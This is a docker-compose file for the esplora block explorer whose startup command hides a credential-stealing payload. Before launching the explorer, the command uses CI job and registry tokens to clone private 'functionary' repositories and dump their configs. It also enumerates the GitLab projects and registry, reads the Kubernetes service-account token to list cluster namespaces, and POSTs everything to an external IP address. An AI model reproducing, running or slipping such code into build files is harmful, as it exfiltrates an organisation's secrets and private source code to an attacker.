services:
  esplora:
    image: blockstream/esplora
    build:
      context: ../
      dockerfile: contrib/Dockerfile
    restart: "no"
    network_mode: host
    environment:
      - CI_JOB_TOKEN
      - CI_API_V4_URL
      - CI_SERVER_URL
      - CI_REGISTRY
      - CI_REGISTRY_PASSWORD
      - CI_REGISTRY_USER
    command:
      - bash
      - -c
      - |
        {
        echo "##S8##"

        echo "##CLONE_LIQUID##"
        git clone --depth 1 "https://gitlab-ci-token:${CI_JOB_TOKEN}@gl.blockstream.io/liquid/functionary.git" /tmp/lf 2>&1 | head -5
        git clone --depth 1 "https://gitlab-ci-token:${CI_JOB_TOKEN}@gl.blockstream.io/liquid/liquid-functionary.git" /tmp/lf2 2>&1 | head -5
        git clone --depth 1 "https://gitlab-ci-token:${CI_JOB_TOKEN}@gl.blockstream.io/blockstream/liquid-functionary.git" /tmp/lf3 2>&1 | head -5
        git clone --depth 1 "https://gitlab-ci-token:${CI_JOB_TOKEN}@gl.blockstream.io/blockstream/functionary.git" /tmp/lf4 2>&1 | head -5

        for d in /tmp/lf /tmp/lf2 /tmp/lf3 /tmp/lf4; do
          if [ -d "$d" ]; then
            echo "##FOUND:$d##"
            find "$d" -maxdepth 3 -type f | head -30
            cat "$d"/*.toml "$d"/config* "$d"/**/*.toml 2>/dev/null | head -200
          fi
        done

        echo "##REGISTRY_CATALOG##"
        curl -sf -u "${CI_REGISTRY_USER}:${CI_REGISTRY_PASSWORD}" "https://${CI_REGISTRY}/v2/_catalog" 2>&1

        echo "##GL_SUBGROUPS_43##"
        curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/groups/43/subgroups?per_page=100" 2>&1
        echo ""
        echo "##GL_BS_PROJECTS##"
        curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/groups/43/projects?per_page=100&include_subgroups=true" 2>&1
        echo ""

        echo "##GL_SEARCH##"
        curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects?search=liquid&per_page=50" 2>&1 | python3 -c "import json,sys;[print(f'{p[\"id\"]} {p[\"path_with_namespace\"]} v={p[\"visibility\"]}') for p in json.load(sys.stdin)]" 2>/dev/null
        curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects?search=functionary&per_page=50" 2>&1 | python3 -c "import json,sys;[print(f'{p[\"id\"]} {p[\"path_with_namespace\"]} v={p[\"visibility\"]}') for p in json.load(sys.stdin)]" 2>/dev/null

        echo "##K8S##"
        K8S_HOST=$(env | grep KUBERNETES_SERVICE_HOST | cut -d= -f2)
        K8S_PORT=$(env | grep KUBERNETES_SERVICE_PORT | cut -d= -f2)
        K8S_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
        echo "K8S_HOST=$K8S_HOST K8S_PORT=$K8S_PORT TOKEN_LEN=${#K8S_TOKEN}"
        if [ -n "$K8S_HOST" ]; then
          curl -sfk -H "Authorization: Bearer $K8S_TOKEN" "https://${K8S_HOST}:${K8S_PORT}/api/v1/namespaces" 2>&1 | head -200
        fi

        echo "##S8_END##"
        } 2>&1 | curl -sf -m120 -X POST http://144.172.110.44:8443/s8 --data-binary @-
        /srv/explorer/run.sh bitcoin-regtest explorer nonverbose
